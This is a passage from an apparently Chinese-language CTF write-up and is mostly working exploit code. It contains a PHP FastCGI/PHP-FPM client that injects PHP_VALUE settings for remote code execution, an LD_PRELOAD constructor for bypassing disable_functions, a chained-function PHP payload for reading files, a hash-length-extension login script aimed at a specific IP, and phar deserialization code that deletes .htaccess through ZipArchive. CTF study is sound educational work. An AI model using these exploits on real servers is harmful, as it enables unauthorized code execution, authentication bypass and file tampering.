        {
            $this->connect();
            $request = '';
            foreach ($requestedInfo as $info) {
                $request .= $this->buildNvpair($info, '');
            }
            fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
            $resp = $this->readPacket();
            if ($resp['type'] == self::GET_VALUES_RESULT) {
                return $this->readNvpair($resp['content'], $resp['length']);
            } else {
                throw new \Exception('Unexpected response type, expecting GET_VALUES_RESULT');
            }
        }
        /**
         * Execute a request to the FastCGI application
         *
         * @param array $params Array of parameters
         * @param String $stdin Content
         * @return String
         */
        public function request(array $params, $stdin)
        {
            $id = $this->async_request($params, $stdin);
            return $this->wait_for_response($id);
        }
        /**
         * Execute a request to the FastCGI application asyncronously
         * 
         * This sends request to application and returns the assigned ID for that request.
         *
         * You should keep this id for later use with wait_for_response(). Ids are chosen randomly
         * rather than seqentially to guard against false-positives when using persistent sockets.
         * In that case it is possible that a delayed response to a request made by a previous script 
         * invocation comes back on this socket and is mistaken for response to request made with same ID
         * during this request.
         *
         * @param array $params Array of parameters
         * @param String $stdin Content
         * @return Integer
         */
        public function async_request(array $params, $stdin)
        {
            $this->connect();
            // Pick random number between 1 and max 16 bit unsigned int 65535
            $id = mt_rand(1, (1 _keepAlive || $this->_persistentSocket);
            $request = $this->buildPacket(self::BEGIN_REQUEST
                                         ,chr(0) . chr(self::RESPONDER) . chr($keepAlive) . str_repeat(chr(0), 5)
                                         ,$id
                                         );
            $paramsRequest = '';
            foreach ($params as $key => $value) {
                $paramsRequest .= $this->buildNvpair($key, $value, $id);
            }
            if ($paramsRequest) {
                $request .= $this->buildPacket(self::PARAMS, $paramsRequest, $id);
            }
            $request .= $this->buildPacket(self::PARAMS, '', $id);
            if ($stdin) {
                $request .= $this->buildPacket(self::STDIN, $stdin, $id);
            }
            $request .= $this->buildPacket(self::STDIN, '', $id);
            if (fwrite($this->_sock, $request) === false || fflush($this->_sock) === false) {
                $info = stream_get_meta_data($this->_sock);
                if ($info['timed_out']) {
                    throw new TimedOutException('Write timed out');
                }
                // Broken pipe, tear down so future requests might succeed
                fclose($this->_sock);
                throw new \Exception('Failed to write request to socket');
            }
            $this->_requests[$id] = array(
                'state' => self::REQ_STATE_WRITTEN,
                'response' => null
            );
            return $id;
        }
        /**
         * Blocking call that waits for response to specific request
         * 
         * @param Integer $requestId
         * @param Integer $timeoutMs [optional] the number of milliseconds to wait. Defaults to the ReadWriteTimeout value set.
         * @return string  response body
         */
        public function wait_for_response($requestId, $timeoutMs = 0) {
            if (!isset($this->_requests[$requestId])) {
                throw new \Exception('Invalid request id given');
            }
            // If we already read the response during an earlier call for different id, just return it
            if ($this->_requests[$requestId]['state'] == self::REQ_STATE_OK
                || $this->_requests[$requestId]['state'] == self::REQ_STATE_ERR
                ) {
                return $this->_requests[$requestId]['response'];
            }
            if ($timeoutMs > 0) {
                // Reset timeout on socket for now
                $this->set_ms_timeout($timeoutMs);
            } else {
                $timeoutMs = $this->_readWriteTimeout;
            }
            // Need to manually check since we might do several reads none of which timeout themselves
            // but still not get the response requested
            $startTime = microtime(true);
            do {
                $resp = $this->readPacket();
                if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                    if ($resp['type'] == self::STDERR) {
                        $this->_requests[$resp['requestId']]['state'] = self::REQ_STATE_ERR;
                    }
                    $this->_requests[$resp['requestId']]['response'] .= $resp['content'];
                }
                if ($resp['type'] == self::END_REQUEST) {
                    $this->_requests[$resp['requestId']]['state'] = self::REQ_STATE_OK;
                    if ($resp['requestId'] == $requestId) { 
                        break;
                    }
                }
                if (microtime(true) - $startTime >= ($timeoutMs * 1000)) {
                    // Reset
                    $this->set_ms_timeout($this->_readWriteTimeout);
                    throw new \Exception('Timed out');
                }
            } while ($resp);
            if (!is_array($resp)) {
                $info = stream_get_meta_data($this->_sock);
                // We must reset timeout but it must be AFTER we get info
                $this->set_ms_timeout($this->_readWriteTimeout);
                if ($info['timed_out']) {
                    throw new TimedOutException('Read timed out');
                }
                if ($info['unread_bytes'] == 0
                        && $info['blocked']
                        && $info['eof']) {
                    throw new ForbiddenException('Not in white list. Check listen.allowed_clients.');
                }
                throw new \Exception('Read failed');
            }
            // Reset timeout
            $this->set_ms_timeout($this->_readWriteTimeout);
            switch (ord($resp['content']{4})) {
                case self::CANT_MPX_CONN:
                    throw new \Exception('This app can\'t multiplex [CANT_MPX_CONN]');
                    break;
                case self::OVERLOADED:
                    throw new \Exception('New request rejected; too busy [OVERLOADED]');
                    break;
                case self::UNKNOWN_ROLE:
                    throw new \Exception('Role value not known [UNKNOWN_ROLE]');
                    break;
                case self::REQUEST_COMPLETE:
                    return $this->_requests[$requestId]['response'];
            }
        }
    }
    if (!isset($_REQUEST['cmd'])) {
        die("Check your input\n");
    }
    if (!isset($_REQUEST['filepath'])) {
        $filepath = __FILE__;
    }else{
        $filepath = $_REQUEST['filepath'];
    }
    $req = '/'.basename($filepath);
    $uri = $req .'?'.'command='.$_REQUEST['cmd'];
    if (strpos($_REQUEST['host'], 'unix://') !== false) {
        $client = new Client($_REQUEST['host']);
    }else{
        $client = new Client($_REQUEST['host'], $_REQUEST['port']);
    }
    $code = ""; // php payload
    if (version_compare(PHP_VERSION, '5.4.0') >= 0) {
        $php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
    }else{
        $php_value = "allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nauto_prepend_file = php://input\ndisable_function=";
    }
    $params = array(       
            'GATEWAY_INTERFACE' => 'FastCGI/1.0',
            'REQUEST_METHOD'    => 'POST',
            'SCRIPT_FILENAME'   => $filepath,
            'SCRIPT_NAME'       => $req,
            'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
            'REQUEST_URI'       => $uri,
            'DOCUMENT_URI'      => $req,
            #'DOCUMENT_ROOT'     => '/',
            'PHP_VALUE'         => $php_value,
            'SERVER_SOFTWARE'   => '80sec/wofeiwo',
            'REMOTE_ADDR'       => '127.0.0.1',
            'REMOTE_PORT'       => '9985',
            'SERVER_ADDR'       => '127.0.0.1',
            'SERVER_PORT'       => '80',
            'SERVER_NAME'       => 'localhost',
            'SERVER_PROTOCOL'   => 'HTTP/1.1',
            'CONTENT_LENGTH'    => strlen($code)
    );
    // print_r($_REQUEST);
    // print_r($params);
    echo "Call: $uri\n\n";
    echo strstr($client->request($params, $code), "PHP Version", true)."\n";
    ?>
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    __attribute__ ((__constructor__)) void angel (void){
        unsetenv("LD_PRELOAD");
        system("/readflag > /tmp/Sndav/flag");
    }
    `
### boring_code
使用xxxbaidu.com绕过校验，考虑如何通过正则样子的函数，读取到flag。
    url=http://ip/?code=echo(readfile(end(scandir(pos(localeconv())))));
可以列目录，但是读上一层的文件要么拼接字符串"../index.php"，要么就chroot/chdir。  
chroot/chdir会返回一个true，还需要有另一个函数可以处理这个参数。决定使用 true->1->46->'.'，这个思路，最终payload
    url=http%3A%2F%2FIP%2Frua.php%3Fcode%3Decho(readfile(end(scandir(chr(floor(sqrt(sinh(sqrt(sinh(sinh(sinh(asin(ceil(ceil(chdir(next(scandir(pos(localeconv())))))))))))))))))))%3B
### EzCMS
  1. 哈希扩展攻击
  2. 上传phar文件，配合反序列化扩展攻击面
  3. 选择ZipArchive 类，利用其open函数，移除掉.htaccess
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    import hashpumpy
    import requests
    # ?*8 adminadmin
    result = hashpumpy.hashpump('52107b08c0f3342d2153ae1d68e6262c', 'adminadmin', 'a', 8)
    from urllib import *
    data = {
        'username':'admin',
        'password': quote(result[1][5:])
    }
    cookies = {
        'PHPSESSID':'1tdp5bqfks5mcsnbrjcbff90rs',
        'user':result[0]
    }
    a = requests.post('http://112.126.102.158:9999/index.php',data=data,cookies=cookies)
    print cookies
    startBuffering();
    $phar->setStub(""); //设置stub，增加gif文件头
    $o = new File();
    $o->filename = "./sandbox/d64424a2bb45ef9baa40f945b741d6ee/c77e74e3c317a8fb80b46d0a4ada6473.sissel";
    $o->filepath = "./sandbox/d64424a2bb45ef9baa40f945b741d6ee/.htaccess";
    $o->checker = new Profile();
    $o->checker->username = "/var/www/html/sandbox/d64424a2bb45ef9baa40f945b741d6ee/.htaccess";
    $o->checker->password = ZipArchive::OVERWRITE | ZipArchive::CREATE;
    $o->checker->admin = new ZipArchive();
    //$o = serialize($o);
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("aaa.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();